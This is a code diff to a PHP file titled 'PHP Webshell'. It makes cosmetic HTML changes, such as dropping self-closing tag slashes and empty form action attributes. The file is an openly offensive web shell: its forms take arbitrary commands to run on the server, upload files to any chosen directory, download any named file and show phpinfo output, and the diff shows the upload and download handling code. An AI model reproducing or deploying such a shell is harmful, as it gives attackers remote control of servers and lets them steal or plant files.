@@ -29,7 +29,7 @@
             readfile($file);
             exit();
         } else {
-            $download_msg = "Error accessing file <code>" . htmlspecialchars($file) . "</code><br />\n";
+            $download_msg = "Error accessing file <code>" . htmlspecialchars($file) . "</code><br>\n";
         }
     }
 
@@ -45,14 +45,14 @@
                 $filename = basename($_FILES["uploadFiles"]["name"][$key]);
                 $dest = $upload_dir . DIRECTORY_SEPARATOR . $filename;
                 if(move_uploaded_file($_FILES["uploadFiles"]["tmp_name"][$key], $dest)) {
-                    $upload_msg .= "Successfully uploaded <code>" . htmlspecialchars($filename) . "</code> to <code>" . htmlspecialchars($dest) . "</code><br />\n";
+                    $upload_msg .= "Successfully uploaded <code>" . htmlspecialchars($filename) . "</code> to <code>" . htmlspecialchars($dest) . "</code><br>\n";
                 } else {
-                    $upload_msg .= "Error saving <code>" . htmlspecialchars($filename) . "</code> to <code>" . htmlspecialchars($dest) . "</code><br />\n";
+                    $upload_msg .= "Error saving <code>" . htmlspecialchars($filename) . "</code> to <code>" . htmlspecialchars($dest) . "</code><br>\n";
                 }
             } else if($error == UPLOAD_ERR_INI_SIZE) {
-                $upload_msg .= "Error uploading <code>" . htmlspecialchars(basename($_FILES["uploadFiles"]["name"][$key])) . "</code>: File too large, maximum is <code>" . htmlspecialchars(ini_get("upload_max_filesize")) ."</code><br />\n";
+                $upload_msg .= "Error uploading <code>" . htmlspecialchars(basename($_FILES["uploadFiles"]["name"][$key])) . "</code>: File too large, maximum is <code>" . htmlspecialchars(ini_get("upload_max_filesize")) ."</code><br>\n";
             } else {
-                $upload_msg .= "Error uploading <code>" . htmlspecialchars(basename($_FILES["uploadFiles"]["name"][$key])) . "</code>, error code: <code>" . htmlspecialchars($error) . "</code><br />\n";
+                $upload_msg .= "Error uploading <code>" . htmlspecialchars(basename($_FILES["uploadFiles"]["name"][$key])) . "</code>, error code: <code>" . htmlspecialchars($error) . "</code><br>\n";
             }
         }
     }
@@ -62,7 +62,7 @@
 <!DOCTYPE html>
 <html>
     <head>
-        <meta charset="UTF-8" />
+        <meta charset="UTF-8">
         <title>PHP Webshell</title>
         <style>
             body {
@@ -83,9 +83,9 @@
         </style>
     </head>
     <body>
-        <form id="cmdForm" method="POST" action="">
-            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox" />
-            <input type="submit" value="Run" />
+        <form id="cmdForm" method="POST">
+            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox">
+            <input type="submit" value="Run">
         </form>
         <div class="infoText">
 <?php
@@ -155,10 +155,10 @@
     }
 ?>
             </div>
-            <form method="POST" action="" enctype="multipart/form-data">
-                <input type="text" name="uploadDir" placeholder="Destination folder" />
-                <input type="file" name="uploadFiles[]" multiple="multiple" />
-                <input type="submit" value="Upload" />
+            <form method="POST" enctype="multipart/form-data">
+                <input type="text" name="uploadDir" placeholder="Destination folder">
+                <input type="file" name="uploadFiles[]" multiple="multiple">
+                <input type="submit" value="Upload">
             </form>
         </div>
         <div class="featureBox">
@@ -170,15 +170,15 @@
     }
 ?>
             </div>
-            <form method="POST" action="">
-                <input type="text" name="downloadFile" placeholder="File to download" />
-                <input type="submit" value="Download" />
+            <form method="POST">
+                <input type="text" name="downloadFile" placeholder="File to download">
+                <input type="submit" value="Download">
             </form>
         </div>
         <div class="featureBox">
             <b>Info</b>
-            <form method="POST" action="" target="_blank">
-                <input type="submit" name="phpinfo" value="phpinfo()" />
+            <form method="POST" target="_blank">
+                <input type="submit" name="phpinfo" value="phpinfo()">
             </form>
         </div>
         <script>
